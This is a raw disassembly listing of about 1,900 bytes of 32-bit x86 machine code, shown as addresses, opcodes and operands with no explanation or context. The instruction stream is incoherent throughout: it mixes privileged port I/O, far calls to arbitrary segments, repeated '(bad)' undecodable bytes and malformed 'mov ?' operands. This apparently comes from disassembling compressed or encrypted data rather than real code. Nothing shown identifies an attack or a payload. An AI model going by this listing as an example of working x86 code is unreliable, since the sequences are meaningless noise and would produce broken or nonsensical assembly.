  43b4ff:	es loop 0x43b51e
  43b502:	fsubr  QWORD PTR [ebx+0x3acb7669]
  43b508:	cdq    
  43b509:	call   0x5a7a:0xd1a14457
  43b510:	add    al,0x15
  43b512:	jb     0x43b4c0
  43b514:	aam    0x9b
  43b516:	mov    al,ds:0xfcc478c6
  43b51b:	aad    0x7c
  43b51d:	mov    ?,WORD PTR [esp+eax*8+0x690a3829]
  43b524:	cmc    
  43b525:	xor    eax,0x942bd72e
  43b52a:	int    0x11
  43b52c:	pusha  
  43b52d:	mov    ds:0xff21d4d6,eax
  43b532:	dec    ecx
  43b533:	dec    eax
  43b534:	aaa    
  43b535:	ret    0x89b3
  43b538:	mov    DWORD PTR [ebp-0x6],eax
  43b53b:	jns    0x43b4ea
  43b53d:	xor    edi,esi
  43b53f:	push   eax
  43b540:	or     bh,bh
  43b542:	lods   eax,DWORD PTR ds:[esi]
  43b543:	lods   eax,DWORD PTR ds:[esi]
  43b544:	shl    BYTE PTR [edx-0x7cc85fcb],0xba
  43b54b:	sbb    eax,0xb16019f9
  43b550:	repz and DWORD PTR [edx-0x3805c9ca],edx
  43b557:	(bad)  
  43b559:	dec    ebx
  43b55a:	mov    BYTE PTR [ebx],al
  43b55c:	into   
  43b55d:	(bad)  
  43b55e:	pop    esi
  43b55f:	push   ebp
  43b560:	push   esi
  43b561:	fs mov eax,0x1fbc9a6c
  43b567:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b568:	lea    esi,[edi-0x7307bd0b]
  43b56e:	xlat   BYTE PTR ss:[ebx]
  43b570:	out    0x4e,al
  43b572:	out    dx,al
  43b573:	or     ah,dh
  43b575:	call   DWORD PTR [ebp-0x40]
  43b578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b579:	sbb    eax,0xe1887fef
  43b57e:	add    BYTE PTR [edx],dl
  43b580:	mov    ah,0x1d
  43b582:	into   
  43b583:	aad    0x6e
  43b585:	repz sbb BYTE PTR [edx+eiz*1],dl
  43b589:	pop    ss
  43b58a:	rol    ecx,cl
  43b58c:	xchg   esi,eax
  43b58d:	adc    ecx,ebp
  43b58f:	out    dx,al
  43b590:	faddp  st(2),st
  43b592:	sbb    dl,0x32
  43b595:	adc    al,0xea
  43b597:	aad    0x5f
  43b599:	imul   ecx,DWORD PTR [edi+0x20558fe3],0xe147b226
  43b5a3:	cmp    esi,DWORD PTR [esi+ecx*4+0x477ad19f]
  43b5aa:	imul   edx,esi,0xc39005c3
  43b5b0:	xor    BYTE PTR [eax-0x1],cl
  43b5b3:	outs   dx,BYTE PTR ds:[esi]
  43b5b4:	mov    ebp,0xd4f9e360
  43b5ba:	fisttp QWORD PTR [ebx]
  43b5bc:	pop    eax
  43b5bd:	inc    ebp
  43b5be:	out    0x9a,eax
  43b5c0:	pop    ds
  43b5c1:	shl    DWORD PTR [ecx+0x55],cl
  43b5c4:	mov    esp,0x5c3ad2a0
  43b5c9:	adc    al,0x12
  43b5cb:	or     DWORD PTR [eax+0x10936b77],ecx
  43b5d1:	in     al,dx
  43b5d2:	add    ch,BYTE PTR [eax-0x54]
  43b5d5:	add    eax,0xc3d36f84
  43b5da:	outs   dx,BYTE PTR ds:[esi]
  43b5db:	lods   al,BYTE PTR ds:[esi]
  43b5dc:	and    DWORD PTR [ebx],ecx
  43b5de:	bound  ecx,QWORD PTR [ebx]
  43b5e0:	data16 jns 0x43b59d
  43b5e3:	arpl   WORD PTR [ebx],cx
  43b5e5:	shl    DWORD PTR [edi],1
  43b5e7:	iret   
  43b5e8:	jmp    0x6088:0xacd8ba2f
  43b5ef:	and    BYTE PTR [edx+eax*8],cl
  43b5f2:	dec    esp
  43b5f3:	jmp    0x9255:0xcfd90f89
  43b5fa:	mov    WORD PTR [edi],cs
  43b5fc:	dec    edx
  43b5fd:	add    esp,DWORD PTR [esi+0xb]
  43b600:	pop    esp
  43b601:	xor    DWORD PTR [edi+0x602506bc],ebx
  43b607:	mov    bl,0x32
  43b609:	cmp    ebp,DWORD PTR [ecx-0x77]
  43b60c:	std    
  43b60d:	mov    ebp,0x2256ef0
  43b612:	shr    BYTE PTR [edi],cl
  43b614:	rcl    bh,1
  43b616:	xchg   esp,eax
  43b617:	enter  0x12f2,0xbe
  43b61b:	or     al,0x8b
  43b61d:	ror    DWORD PTR [esi-0x6f20018d],0x89
  43b624:	sbb    BYTE PTR [ebx+0x7c0d559],dl
  43b62a:	addr16 push ecx
  43b62c:	dec    edx
  43b62d:	pop    ecx
  43b62e:	pop    edx
  43b62f:	pop    ebp
  43b630:	mov    DWORD PTR [edi],ebx
  43b632:	mov    ecx,0xdb0bb1d
  43b637:	push   ds
  43b638:	into   
  43b639:	pop    ds
  43b63a:	sbb    al,0xf3
  43b63c:	lahf   
  43b63d:	sbb    BYTE PTR [ebx+edx*4],0xd8
  43b641:	es aaa 
  43b643:	sub    DWORD PTR [eax-0x7e39bec7],ecx
  43b649:	test   eax,0xfe4eb373
  43b64e:	mov    ss,ebp
  43b650:	push   esi
  43b651:	enter  0x5fa6,0xe9
  43b655:	mov    ds:0x43867e9e,al
  43b65a:	call   0x8ecb:0xff93629a
  43b661:	nop
  43b662:	rcl    ebx,cl
  43b664:	add    DWORD PTR [esi+0x4b],esi
  43b667:	push   cs
  43b668:	xor    ebx,DWORD PTR [eax]
  43b66a:	push   cs
  43b66b:	xor    esi,eax
  43b66d:	clc    
  43b66e:	pusha  
  43b66f:	jg     0x43b6cc
  43b671:	xlat   BYTE PTR ds:[ebx]
  43b672:	rol    BYTE PTR [ecx-0x2b5827fc],0xc8
  43b679:	cli    
  43b67a:	sbb    esp,DWORD PTR [ecx-0x2e7d1dbb]
  43b680:	mov    BYTE PTR [edi],dh
  43b682:	jecxz  0x43b65a
  43b684:	retf   0x9707
  43b687:	inc    edx
  43b688:	mov    ds:0xc0d57c02,eax
  43b68d:	fisttp QWORD PTR [esi]
  43b68f:	in     eax,0xe2
  43b691:	fbld   TBYTE PTR [eax+0x37]
  43b694:	out    dx,al
  43b695:	add    BYTE PTR [ebp-0x64],0xc9
  43b699:	sbb    edx,DWORD PTR [edi+0x1f1d8444]
  43b69f:	lock fmul DWORD PTR [edi]
  43b6a2:	lds    esi,FWORD PTR [ecx+0x7560f4d3]
  43b6a8:	rep stos BYTE PTR es:[edi],al
  43b6aa:	xchg   ecx,eax
  43b6ab:	push   ecx
  43b6ac:	or     ah,BYTE PTR [ebp-0x3a]
  43b6af:	aad    0xd5
  43b6b1:	and    eax,0xb074395d
  43b6b6:	push   cs
  43b6b7:	add    BYTE PTR [ecx-0x37e2c845],cl
  43b6bd:	push   cs
  43b6be:	mov    bh,0xa8
  43b6c0:	dec    esp
  43b6c1:	ds cli 
  43b6c3:	dec    esi
  43b6c4:	xchg   ebp,eax
  43b6c5:	add    dl,BYTE PTR [esi+edi*2]
  43b6c8:	scas   al,BYTE PTR es:[edi]
  43b6c9:	pop    esp
  43b6ca:	xlat   BYTE PTR ds:[ebx]
  43b6cb:	mov    dh,0xc9
  43b6cd:	adc    BYTE PTR [esi-0x50ae772e],0xa7
  43b6d4:	imul   dh
  43b6d6:	std    
  43b6d7:	ja     0x43b751
  43b6d9:	add    esp,DWORD PTR [esp+ebx*4]
  43b6dc:	adc    DWORD PTR [ebx+0xd7808e],0x7c
  43b6e3:	sbb    DWORD PTR [ebx],eax
  43b6e5:	ret    
  43b6e6:	push   eax
  43b6e7:	cmp    esp,DWORD PTR [eax]
  43b6e9:	add    ah,BYTE PTR [ecx+0x147c92bc]
  43b6ef:	aam    0xa3
  43b6f1:	int    0x79
  43b6f3:	arpl   WORD PTR [edx-0x5f],ax
  43b6f6:	in     eax,dx
  43b6f7:	test   al,0x89
  43b6f9:	aaa    
  43b6fa:	in     eax,0xf1
  43b6fc:	hlt    
  43b6fd:	and    bh,BYTE PTR [ecx+ebx*8+0x10]
  43b701:	test   DWORD PTR [edi-0x4a41502c],0xb4c54d5
  43b70b:	xor    BYTE PTR [ecx+0x16e65d6d],cl
  43b711:	sbb    al,0xc8
  43b713:	dec    DWORD PTR [eax+0x3]
  43b716:	mov    eax,0x79d503c8
  43b71b:	jge    0x43b69d
  43b71d:	add    eax,0xb014931f
  43b722:	lods   eax,DWORD PTR ds:[esi]
  43b723:	out    dx,al
  43b724:	(bad)  
  43b725:	ror    BYTE PTR [ebx-0x7842232b],0x5c
  43b72c:	add    bl,BYTE PTR [ebx+0x1d]
  43b72f:	jl     0x43b6b9
  43b731:	sbb    ebp,ebp
  43b733:	push   ebx
  43b734:	mov    eax,0x9df745ef
  43b739:	adc    al,0x40
  43b73b:	inc    ecx
  43b73c:	loop   0x43b76e
  43b73e:	or     BYTE PTR [esi+ebp*2-0x77944c18],dh
  43b745:	in     eax,0xcc
  43b747:	lds    eax,FWORD PTR ss:[ecx]
  43b74a:	mov    eax,ds:0x5a05f189
  43b74f:	sub    al,0x7b
  43b751:	inc    ebp
  43b752:	test   BYTE PTR [ebx+0x2d60c66a],ch
  43b758:	push   0xa0192e4c
  43b75d:	mov    ebp,0x3debd475
  43b762:	rol    DWORD PTR [edx-0x7d],1
  43b765:	out    0xf7,al
  43b767:	push   ss
  43b768:	(bad)  
  43b769:	mov    edi,0xa522b5b5
  43b76e:	dec    esi
  43b76f:	pop    ss
  43b770:	aaa    
  43b771:	scas   eax,DWORD PTR es:[edi]
  43b772:	out    dx,eax
  43b773:	xchg   edx,eax
  43b774:	mov    ebp,0x55fa4605
  43b779:	push   es
  43b77a:	(bad)  
  43b77b:	push   0x1160e9a9
  43b780:	int3   
  43b781:	sti    
  43b782:	inc    edx
  43b783:	stos   DWORD PTR es:[edi],eax
  43b784:	jle    0x43b724
  43b786:	mov    bh,0xd5
  43b788:	adc    eax,0x4ec8692d
  43b78d:	(bad)  
  43b78e:	or     eax,0xe9298917
  43b793:	js     0x43b7d8
  43b795:	pushf  
  43b796:	xchg   esi,eax
  43b797:	add    ecx,DWORD PTR [edx+eax*1-0x7c]
  43b79b:	dec    ebp
  43b79c:	xchg   DWORD PTR [esi+0x1e],esi
  43b79f:	enter  0xe986,0x1f
  43b7a3:	rol    DWORD PTR [ebp-0x60],0xf
  43b7a7:	fwait
  43b7a8:	jl     0x43b78e
  43b7aa:	dec    esi
  43b7ab:	rcl    ch,0x11
  43b7ae:	out    0xa5,al
  43b7b0:	call   0x2bcf:0x40d4d073
  43b7b7:	mov    al,ds:0x5d2bc173
  43b7bc:	xchg   ecx,eax
  43b7bd:	sub    eax,0x6ea3fb3
  43b7c2:	out    0xd4,eax
  43b7c4:	test   BYTE PTR [eax+0x5c5a46c9],0x97
  43b7cb:	or     al,0xf2
  43b7cd:	leave  
  43b7ce:	dec    ecx
  43b7cf:	aam    0x37
  43b7d1:	inc    edi
  43b7d2:	and    al,0x6
  43b7d4:	inc    eax
  43b7d5:	(bad)  
  43b7d6:	fcmovbe st,st(4)
  43b7d8:	cmc    
  43b7d9:	cmp    esi,DWORD PTR [eax+ecx*2+0x24f941b1]
  43b7e0:	add    DWORD PTR [ebp-0x2],0xffffffc1
  43b7e4:	aaa    
  43b7e5:	xchg   esp,eax
  43b7e6:	loop   0x43b7ac
  43b7e8:	xchg   ebx,eax
  43b7e9:	jmp    0x43b84b
  43b7eb:	shr    BYTE PTR [eax-0x64],1
  43b7ee:	popf   
  43b7ef:	mov    ebp,0x5965ea1e
  43b7f4:	(bad)  
  43b7f5:	in     eax,dx
  43b7f6:	test   BYTE PTR [eax],ah
  43b7f8:	inc    edx
  43b7f9:	jns    0x43b7ae
  43b7fb:	(bad)  
  43b7fc:	push   ss
  43b7fd:	xlat   BYTE PTR ds:[ebx]
  43b7fe:	and    BYTE PTR es:[ebx-0x76431133],0xeb
  43b806:	in     al,dx
  43b807:	push   0x20
  43b809:	sbb    al,0xa1
  43b80b:	addr16 fs add ch,ah
  43b80f:	xlat   BYTE PTR ds:[ebx]
  43b810:	jp     0x43b855
  43b812:	int    0x21
  43b814:	cmp    al,0x2e
  43b816:	push   ds
  43b817:	mov    ecx,0x93821be1
  43b81c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b81d:	in     al,dx
  43b81e:	(bad)  
  43b81f:	rcr    DWORD PTR [ecx],cl
  43b821:	dec    esp
  43b822:	ret    
  43b823:	adc    BYTE PTR [ecx+0xa],dh
  43b826:	pusha  
  43b827:	mov    DWORD PTR [esi+0x6ed78e],ebp
  43b82d:	xchg   edi,eax
  43b82e:	mov    ah,0x9d
  43b830:	outs   dx,BYTE PTR ds:[esi]
  43b831:	mov    esp,0xfda7d5e6
  43b836:	ror    DWORD PTR [ecx+0x40],0x19
  43b83a:	jnp    0x43b7ef
  43b83c:	loopne 0x43b861
  43b83e:	jecxz  0x43b7d6
  43b840:	mov    esi,0x4090a1c3
  43b845:	jmp    0x1a4a5ba5
  43b84a:	ins    DWORD PTR es:[edi],dx
  43b84b:	add    DWORD PTR [ecx+0x56b69daf],ecx
  43b851:	jl     0x43b862
  43b853:	mov    ch,0x97
  43b855:	cmp    DWORD PTR ds:0x5242bad3,edx
  43b85b:	out    0x92,eax
  43b85d:	icebp  
  43b85e:	hlt    
  43b85f:	aam    0x1d
  43b861:	into   
  43b862:	mov    bh,0x8a
  43b864:	cmp    BYTE PTR [edx+0xa],dl
  43b867:	popa   
  43b868:	mov    BYTE PTR [ebp-0x13],al
  43b86b:	out    dx,al
  43b86c:	mov    esi,0xb8794651
  43b871:	add    dl,BYTE PTR [esi-0x19]
  43b874:	or     edi,DWORD PTR [edx]
  43b876:	inc    ecx
  43b877:	call   0xddb0dbac
  43b87c:	mov    ds:0xa38f376,al
  43b881:	ss dec esp
  43b883:	or     eax,DWORD PTR [ebx-0x75]
  43b886:	adc    bl,al
  43b888:	mov    ecx,0xbe59b805
  43b88d:	xchg   edi,eax
  43b88e:	fidivr DWORD PTR [edi-0x2b]
  43b891:	and    al,0x68
  43b893:	pop    ebp
  43b894:	push   eax
  43b895:	inc    eax
  43b896:	cdq    
  43b897:	jne    0x43b8a1
  43b899:	mov    ebx,0x1ead5bb0
  43b89e:	sub    al,cl
  43b8a0:	sub    al,0x9c
  43b8a2:	inc    eax
  43b8a3:	add    al,0x88
  43b8a5:	and    al,0x55
  43b8a7:	xchg   ecx,eax
  43b8a8:	mov    bl,0xe5
  43b8aa:	pop    eax
  43b8ab:	push   ecx
  43b8ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b8ad:	and    DWORD PTR [edx+0x1d],esp
  43b8b0:	push   ds
  43b8b1:	rcl    BYTE PTR fs:[esp+ebx*4],cl
  43b8b5:	adc    BYTE PTR [ebx],cl
  43b8b7:	xlat   BYTE PTR ds:[ebx]
  43b8b8:	push   ss
  43b8b9:	cmp    BYTE PTR [edi-0x7824726c],dl
  43b8bf:	xchg   esp,eax
  43b8c0:	lods   al,BYTE PTR ds:[esi]
  43b8c1:	out    dx,eax
  43b8c2:	in     al,0x8b
  43b8c4:	xchg   BYTE PTR [ecx-0x10],dh
  43b8c7:	hlt    
  43b8c8:	sub    DWORD PTR [ebp+0xfdf9fd6],esi
  43b8ce:	test   DWORD PTR [esi+eax*1],eax
  43b8d1:	pop    edx
  43b8d2:	pop    ds
  43b8d3:	sub    eax,0xa96e4fa4
  43b8d8:	xor    eax,0xf4b960ce
  43b8dd:	or     al,0xf2
  43b8df:	jo     0x43b8d5
  43b8e1:	daa    
  43b8e2:	and    bl,BYTE PTR [eax-0x2fc4ee2e]
  43b8e8:	lahf   
  43b8e9:	sti    
  43b8ea:	jmp    0x43b889
  43b8ec:	dec    ecx
  43b8ed:	out    dx,eax
  43b8ee:	call   0xb38a:0x60298c92
  43b8f5:	xor    dl,BYTE PTR [eax+0x15]
  43b8f8:	test   al,0xfa
  43b8fa:	push   esi
  43b8fb:	aad    0x5f
  43b8fd:	(bad)  
  43b8fe:	push   ds
  43b8ff:	aaa    
  43b900:	scas   eax,DWORD PTR es:[edi]
  43b901:	lahf   
  43b902:	jb     0x43b8a8
  43b904:	mov    BYTE PTR [edi-0x47519203],bh
  43b90a:	xlat   BYTE PTR ds:[ebx]
  43b90b:	dec    esp
  43b90c:	or     BYTE PTR es:[ecx-0x51],dh
  43b910:	pop    esi
  43b911:	xchg   edx,eax
  43b912:	sbb    dl,BYTE PTR [ecx-0x506cfec0]
  43b918:	inc    ecx
  43b919:	call   0x3960:0x9076a616
  43b920:	dec    esi
  43b921:	sub    dl,ah
  43b923:	aaa    
  43b924:	bound  eax,QWORD PTR [edi+0x51]
  43b927:	aad    0x7
  43b929:	addr16 adc ch,dh
  43b92c:	mov    eax,ds:0xff33b9e7
  43b931:	loope  0x43b941
  43b933:	aam    0x3e
  43b935:	sub    cl,BYTE PTR [edi-0x53144975]
  43b93b:	fwait
  43b93c:	push   ebp
  43b93d:	sar    dl,cl
  43b93f:	mov    edx,0x99fb063
  43b944:	push   edx
  43b945:	xor    BYTE PTR [edi],bh
  43b947:	cmc    
  43b948:	ror    DWORD PTR [ebp-0x69],1
  43b94b:	sub    ecx,DWORD PTR [ecx+0x7057087d]
  43b951:	push   ss
  43b952:	out    dx,eax
  43b953:	aam    0x9b
  43b955:	and    BYTE PTR [edx-0xb],0x0
  43b959:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b95a:	fs sar cl,cl
  43b95d:	sub    edi,edx
  43b95f:	aad    0xa5
  43b961:	and    DWORD PTR [ecx+0x72],edx
  43b964:	out    dx,eax
  43b965:	and    BYTE PTR [edi-0x6c],cl
  43b968:	ds daa 
  43b96a:	mov    eax,0xe97de2d4
  43b96f:	hlt    
  43b970:	gs in  al,dx
  43b972:	fisub  WORD PTR [ebp+0x8]
  43b975:	xchg   edi,eax
  43b976:	ja     0x43b9b2
  43b978:	pop    ebx
  43b979:	adc    DWORD PTR [ebx-0xf],esp
  43b97c:	or     eax,DWORD PTR [ebx]
  43b97e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b97f:	adc    BYTE PTR [bp+di],bl
  43b982:	rol    DWORD PTR [ecx],0x4
  43b985:	add    BYTE PTR [edi],bl
  43b987:	fwait
  43b988:	dec    esp
  43b989:	test   eax,0xf01bf994
  43b98e:	pop    ebx
  43b98f:	repnz outs dx,DWORD PTR ds:[esi]
  43b991:	add    bl,BYTE PTR [edx-0x55]
  43b994:	jae    0x43b9b7
  43b996:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b997:	iret   
  43b998:	xchg   esi,eax
  43b999:	aas    
  43b99a:	out    dx,eax
  43b99b:	push   ecx
  43b99c:	inc    edi
  43b99d:	sbb    eax,0xb2759938
  43b9a2:	and    DWORD PTR [ebp-0x557930b7],esi
  43b9a8:	mov    eax,0xb699e849
  43b9ad:	xchg   esp,eax
  43b9ae:	mov    bh,bh
  43b9b0:	scas   eax,DWORD PTR es:[edi]
  43b9b1:	loop   0x43b972
  43b9b3:	sub    al,cl
  43b9b5:	div    BYTE PTR [edx+0x3b]
  43b9b8:	fdivr  DWORD PTR [edx+edx*1]
  43b9bb:	aaa    
  43b9bc:	mov    ss,WORD PTR [esi+eiz*4]
  43b9bf:	cli    
  43b9c0:	sbb    edx,esi
  43b9c2:	add    dl,BYTE PTR [edi]
  43b9c4:	lock sbb DWORD PTR ds:0xb9c991d3,eax
  43b9cb:	test   BYTE PTR [edx+ecx*2-0x18df2833],dh
  43b9d2:	push   edx
  43b9d3:	lahf   
  43b9d4:	mov    al,BYTE PTR [ecx-0x38]
  43b9d7:	xchg   esp,eax
  43b9d8:	test   al,0xb5
  43b9da:	pusha  
  43b9db:	ret    
  43b9dc:	(bad)  
  43b9dd:	mov    ecx,0x45c06e89
  43b9e2:	loope  0x43b9b8
  43b9e4:	mov    dh,0x8c
  43b9e6:	stos   DWORD PTR es:[edi],eax
  43b9e7:	shr    BYTE PTR [edi+0x1e],1
  43b9ea:	jne    0x43b9b7
  43b9ec:	jno    0x43ba1d
  43b9ee:	ins    BYTE PTR es:[edi],dx
  43b9ef:	mov    bh,0x15
  43b9f1:	adc    al,0xfd
  43b9f3:	mov    ds:0x984c3529,al
  43b9f8:	jno    0x43b9ac
  43b9fa:	pop    ebp
  43b9fb:	je     0x43ba70
  43b9fd:	add    al,BYTE PTR [edx+0x2]
  43ba00:	mov    esi,0x5a1ad7e5
  43ba05:	ret    
  43ba06:	pusha  
  43ba07:	(bad)  
  43ba09:	div    ebp
  43ba0b:	adc    eax,0xd5849c14
  43ba10:	sub    DWORD PTR [edi+0x32],eax
  43ba13:	leave  
  43ba14:	stos   DWORD PTR es:[edi],eax
  43ba15:	and    dh,BYTE PTR [esi-0x4e]
  43ba18:	mov    BYTE PTR ds:0x655846b2,dh
  43ba1e:	test   cl,ch
  43ba20:	xor    eax,DWORD PTR [ebx]
  43ba22:	jp     0x43ba43
  43ba24:	imul   ebp,DWORD PTR [ecx-0x50],0xffffffbe
  43ba28:	dec    edx
  43ba29:	test   DWORD PTR [ecx-0x27],esp
  43ba2c:	push   edx
  43ba2d:	loope  0x43ba2c
  43ba2f:	(bad)  
  43ba30:	out    dx,al
  43ba31:	into   
  43ba32:	aas    
  43ba33:	loopne 0x43ba37
  43ba35:	add    esp,esi
  43ba37:	sbb    ecx,DWORD PTR [edx-0x41965b2f]
  43ba3d:	xor    BYTE PTR [edx],bl
  43ba3f:	push   edi
  43ba40:	xchg   DWORD PTR [ebx+0x2e],ebp
  43ba43:	loopne 0x43b9f1
  43ba45:	jg     0x43bac6
  43ba47:	iret   
  43ba48:	push   ss
  43ba49:	xchg   esp,eax
  43ba4a:	outs   dx,BYTE PTR ds:[esi]
  43ba4b:	aad    0xf5
  43ba4d:	jmp    0x43bab3
  43ba4f:	stc    
  43ba50:	sub    ebx,DWORD PTR [edx+esi*4]
  43ba53:	sbb    DWORD PTR [ecx-0x2b0c5eef],eax
  43ba59:	mul    eax
  43ba5b:	into   
  43ba5c:	mov    bl,0xc8
  43ba5e:	fcomp  st(0)
  43ba60:	pop    edx
  43ba61:	add    al,BYTE PTR [eax]
  43ba63:	jecxz  0x43ba26
  43ba65:	mov    ?,WORD PTR [ebp-0x70]
  43ba68:	fmul   DWORD PTR [esi]
  43ba6a:	pop    ds
  43ba6b:	imul   ebp,DWORD PTR [ebx],0xffffff86
  43ba6e:	(bad)  
  43ba6f:	xor    al,0x58
  43ba71:	loope  0x43b9fa
  43ba73:	clc    
  43ba74:	int3   
  43ba75:	adc    DWORD PTR [ebx+eax*2-0x2f8c7f6a],ebx
  43ba7c:	or     DWORD PTR [ebp-0x1fb65a25],esp
  43ba82:	in     al,dx
  43ba83:	jno    0x43ba0e
  43ba85:	fwait
  43ba86:	or     ch,BYTE PTR [ebx+ebp*8]
  43ba89:	fst    DWORD PTR [esp+ebx*2-0x46]
  43ba8d:	dec    edx
  43ba8e:	push   0x8d0214dd
  43ba93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ba94:	cmp    ebp,edi
  43ba96:	mov    ds:0x1ddf887c,eax
  43ba9b:	in     al,dx
  43ba9c:	lahf   
  43ba9d:	call   eax
  43ba9f:	jae    0x43ba42
  43baa1:	push   ds
  43baa2:	dec    edx
  43baa3:	test   DWORD PTR [ebp+0x15],ebx
  43baa6:	popa   
  43baa7:	dec    eax
  43baa8:	or     bh,BYTE PTR [edx+0x3f301dd4]
  43baae:	pop    ds
  43baaf:	xchg   edi,eax
  43bab0:	sub    BYTE PTR [ebx+0x13],bh
  43bab3:	jge    0x43bac3
  43bab5:	jo     0x43baf8
  43bab7:	rcl    BYTE PTR [esi+0x76868f18],cl
  43babd:	call   0x3a918782
  43bac2:	mov    ds,WORD PTR [edi-0x47417872]
  43bac8:	dec    DWORD PTR [edi+edx*4]
  43bacb:	push   eax
  43bacc:	shr    edx,1
  43bace:	stos   DWORD PTR es:[edi],eax
  43bacf:	push   esp
  43bad0:	mov    edx,0x4fd5c15c
  43bad5:	xchg   edi,ebp
  43bad7:	xor    edx,esi
  43bad9:	repnz int3 
  43badb:	scas   al,BYTE PTR es:[edi]
  43badc:	xchg   BYTE PTR [ebp+0x46499cf7],cl
  43bae2:	jg     0x43ba8b
  43bae4:	add    bh,BYTE PTR ds:0xf59ad54d
  43baea:	int    0x4f
  43baec:	sub    esi,DWORD PTR [eax]
  43baee:	adc    BYTE PTR [ecx+ecx*4-0x2fe72d79],ch
  43baf5:	ror    BYTE PTR [eax+0x7f],cl
  43baf8:	inc    eax
  43baf9:	clc    
  43bafa:	sub    eax,0xb392fbe8
  43baff:	mov    ch,0xf9
  43bb01:	imul   edi,DWORD PTR [edx+edx*4+0x62],0xa2d44566
  43bb09:	icebp  
  43bb0a:	xadd   ah,ch
  43bb0d:	jno    0x43bb2d
  43bb0f:	mov    ch,0xb7
  43bb11:	bound  esp,QWORD PTR [ecx+0x2f]
  43bb14:	xchg   BYTE PTR [eax+0x1c3fa204],bl
  43bb1a:	mov    ds:0xe6d8894a,eax
  43bb1f:	es pop ds
  43bb21:	cld    
  43bb22:	pusha  
  43bb23:	adc    edi,0x53
  43bb26:	and    eax,DWORD PTR [ebp-0x2bed7916]
  43bb2c:	fimul  DWORD PTR [ecx]
  43bb2e:	cmp    eax,0x75b66ff8
  43bb33:	loopne 0x43bac9
  43bb35:	std    
  43bb36:	rcl    DWORD PTR [esi+0x4e55c31a],0x1a
  43bb3d:	loopne 0x43bafc
  43bb3f:	aam    0xf3
  43bb41:	loope  0x43bb5a
  43bb43:	cmp    DWORD PTR [eax-0x7681825a],ebx
  43bb49:	pop    es
  43bb4a:	dec    ecx
  43bb4b:	imul   eax,DWORD PTR gs:[edi+0x3d5a95d],0xffffffcc
  43bb53:	push   cs
  43bb54:	inc    ecx
  43bb55:	cmp    edi,0x3b
  43bb58:	adc    DWORD PTR [edx+0xc461d27],eax
  43bb5e:	pusha  
  43bb5f:	in     eax,0xdb
  43bb61:	gs jg  0x43bb16
  43bb64:	xchg   edx,eax
  43bb65:	inc    ebp
  43bb66:	(bad)  
  43bb68:	push   0x4e
  43bb6a:	push   edi
  43bb6b:	shl    cl,1
  43bb6d:	and    eax,0x3885ab6
  43bb72:	ja     0x43bb10
  43bb74:	sub    eax,DWORD PTR [ebx+0x5a41332]
  43bb7a:	push   eax
  43bb7b:	cmp    edx,0x48498045
  43bb81:	sahf   
  43bb82:	pop    ds
  43bb83:	adc    esi,DWORD PTR [ecx+0x58]
  43bb86:	ins    DWORD PTR es:[edi],dx
  43bb87:	jae    0x43bbfb
  43bb89:	mov    edx,0xc9aad59b
  43bb8e:	inc    ebx
  43bb8f:	cwde   
  43bb90:	mov    edi,0x8a21bec1
  43bb95:	dec    ebx
  43bb96:	adc    eax,eax
  43bb98:	aaa    
  43bb99:	iret   
  43bb9a:	(bad)  
  43bb9b:	call   0xf7877b69
  43bba0:	rol    DWORD PTR ds:0x59f58bd6,1
  43bba6:	in     al,dx
  43bba7:	cmp    eax,0xf57667d
  43bbac:	and    BYTE PTR [ecx+0x16],bh
  43bbaf:	fwait
  43bbb0:	inc    eax
  43bbb1:	imul   esp,ebx,0x53
  43bbb4:	cdq    
  43bbb5:	jmp    0x43bba2
  43bbb7:	(bad)  
  43bbb8:	popaw  
  43bbba:	loopne 0x43bb5e
  43bbbc:	call   0x11298ff0
  43bbc1:	add    edx,eax
  43bbc3:	mov    edx,0x8995406e
  43bbc8:	xor    ecx,DWORD PTR [eax]
  43bbca:	imul   edx,ecx,0x4a21d287
  43bbd0:	ja     0x43bbd5
  43bbd2:	sahf   
  43bbd3:	xor    BYTE PTR [ebp-0x8],bh
  43bbd6:	in     eax,0xd8
  43bbd8:	sahf   
  43bbd9:	xchg   ebx,eax
  43bbda:	dec    ecx
  43bbdb:	test   al,0xe7
  43bbdd:	mov    ah,0x60
  43bbdf:	out    0xcd,eax
  43bbe1:	mov    edx,cs
  43bbe3:	inc    esi
  43bbe4:	mov    DWORD PTR [edi-0x2f2e98aa],ebp
  43bbea:	push   ss
  43bbeb:	mov    edx,0x2c100265
  43bbf0:	pop    es
  43bbf1:	clc    
  43bbf2:	outs   dx,DWORD PTR ds:[esi]
  43bbf3:	outs   dx,DWORD PTR ds:[esi]
  43bbf4:	jo     0x43bbe2
  43bbf6:	(bad)  
  43bbf7:	leave  
  43bbf8:	mov    ah,0x1e
  43bbfa:	lea    ebx,[eax+0x45]
  43bbfd:	mov    edx,0x21aaaf7
  43bc02:	lods   al,BYTE PTR ds:[esi]
  43bc03:	rol    BYTE PTR [edi],cl
  43bc05:	push   edi
  43bc06:	into   
  43bc07:	xchg   ebx,eax
  43bc08:	repnz ds push ds
  43bc0b:	pop    ds
  43bc0c:	adc    eax,0x3550fdcc
  43bc11:	ficom  WORD PTR [edx-0x24]
  43bc14:	mov    bl,0x2
  43bc16:	dec    edx
  43bc17:	gs ss in eax,0x1c
  43bc1b:	arpl   WORD PTR [ebx-0x2c],cx
  43bc1e:	pop    ds
  43bc1f:	inc    ebx
  43bc20:	inc    eax
  43bc21:	mov    edi,0x4d1c8775
  43bc26:	in     al,dx
  43bc27:	aad    0xe
  43bc29:	pop    eax
  43bc2a:	sar    BYTE PTR [ebx-0x77cc3308],0x88
  43bc31:	lods   eax,DWORD PTR ds:[esi]
  43bc32:	icebp  
  43bc33:	jecxz  0x43bbf1
  43bc35:	xor    ebx,ebp
  43bc37:	xchg   esi,eax
  43bc38:	add    BYTE PTR [edx],al
  43bc3a:	fiadd  DWORD PTR [ebx]
  43bc3c:	(bad)  
  43bc3d:	ins    DWORD PTR es:[edi],dx
  43bc3e:	out    0xf0,eax
  43bc40:	dec    ecx
  43bc41:	jo     0x43bc44
  43bc43:	call   0xb333:0xa3550f88
  43bc4a:	ja     0x43bc7f
  43bc4c:	dec    ebx
